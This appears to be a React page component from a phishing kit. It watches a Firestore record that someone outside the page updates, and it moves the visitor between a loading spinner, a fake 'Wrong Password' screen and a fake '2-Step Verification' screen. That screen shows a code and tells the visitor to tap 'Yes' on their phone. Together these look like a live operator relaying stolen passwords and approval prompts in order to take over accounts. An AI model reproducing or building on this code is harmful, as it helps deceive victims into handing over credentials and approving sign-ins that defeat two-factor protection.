import React, { useEffect, useState } from 'react'
import Logo from '../assets/logo.png'
import Mobile from '../assets/mobile.png'
import { useNavigate, useParams } from 'react-router-dom'
import { db } from '../config/firebase'
import { doc, onSnapshot } from 'firebase/firestore'

const Loading = () => {

  const { username, docId } = useParams(); // Get the document ID from route params
  const navigate = useNavigate();
  const [status, setStatus] = useState('loading');
  const [documentData, setDocumentData] = useState(null);

  useEffect(() => {

    if (!docId) {
      console.error('Document ID is missing!');
      return;
    }

    const docRef = doc(db, 'data', docId)
    const unsubscribe = onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data()
        setDocumentData(data)
        setStatus(data?.status)
      } else {
        console.log('document does not exist!')
      }
    })
    return () => unsubscribe();
  }, [docId])

  useEffect(() => {
    if (status === 'successful') {
      navigate(`/${username}/sign-in`);
    }
  }, [status, navigate]);

  if (status == 'loading') {
    return (
      <div className="flex items-center justify-center h-screen">
        <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-blue-500 border-opacity-75"></div>
      </div>
    )
  }

  if (status == 'wrongPass') {
    return (
      <div className="min-h-dvh flex items-center justify-center bg-gray-100">
        <div className="bg-white h-auto shadow-lg rounded-lg py-10 px-4 w-[95%] min-w-[300px] max-w-[350px] md:p-8 md:w-[450px] md:max-w-[90%]">
          <div className="text-center">
            <img
              src={Logo}
              alt="Logo"
              className="w-20 h-auto mx-auto"
            />
            <h3 className="text-2xl font-semibold mt-4">Wrong Password</h3>
            <p className="text-gray-600 mt-2 text-lg">
              The password you entered is incorrect. Please try again.
            </p>
          </div>
          <div className="mt-6 text-center">
            <button
              onClick={() => navigate(`/${username}/sign-in?wrongPass=true`)}
              className="bg-blue-600 text-white px-4 py-2 rounded-md hover:bg-blue-700 transition-colors"
            >
              Go Back to Sign In
            </button>
          </div>
        </div>
      </div>
    )
  }

  if (status == 'verify') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <div className="bg-white h-screen md:h-auto shadow-lg rounded-lg p-8 md:w-[450px] w-full md:max-w-[90%]">
          <div className="text-center">
            <img
              src={Logo}
              alt="Logo"
              className="w-20 h-auto mx-auto"
            />
            <h3 className="text-2xl font-semibold mt-4">2-Step Verification</h3>
            <p className="text-gray-600 mt-2 text-lg">
              To help keep your account safe, we want to ensure it's really you.
            </p>
          </div>
          <div className="mt-6 text-center">
            <img
              src={Mobile}
              alt="Verification animation"
              className="w-32 mx-auto"
            />
            <h4 className="text-lg font-medium mt-4">Check your phone</h4>
            <h2 className="text-3xl font-bold">{documentData?.code}</h2>
            <p className="text-gray-600 mt-2 text-lg">
              We've sent a notification to your phone. Tap *Yes* to verify it's you.
            </p>
            <div className="flex items-center mt-4">
              <input type="checkbox" id="dont-ask-again" />
              <label htmlFor="dont-ask-again" className="ml-2 text-gray-600">
                Don't ask again on this device
              </label>
            </div>
            <div className="flex flex-col items-start mt-4">
              <button className="text-sm text-blue-600 font-medium hover:underline">
                Resend it
              </button>
              <button className="text-sm text-blue-600 font-semibold hover:underline">
                Try another way
              </button>
            </div>
          </div>
        </div>
      </div>
    )
  }

}

export default Loading